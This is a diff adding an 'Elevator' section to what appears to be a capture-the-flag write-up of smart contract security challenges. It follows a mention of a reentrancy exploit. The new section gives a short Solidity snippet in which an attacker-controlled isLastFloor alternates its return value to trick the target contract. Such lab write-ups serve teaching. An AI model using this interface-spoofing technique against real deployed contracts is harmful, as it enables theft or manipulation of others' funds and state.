@@ -140,3 +140,16 @@ await contract.donate("insert your attacker contract's address here",{value: eth
 
 ```
 After that all you need to do is to write a reentracy exploit on a malicouse contract. This would be ReenA.sol
+
+## Elevator 
+The main security issue with elevator is that we are able to implement it because the building interface does not implement it inside the function 
+So all we have to do is write a function for islastfloor that passess both cases so we can make top true
+```
+answer = true
+function isLastFloor(uint) external returns(bool){
+answer = !answer;
+return answer
+}
+```
+Thats basically all you do in your malicouse code 
+
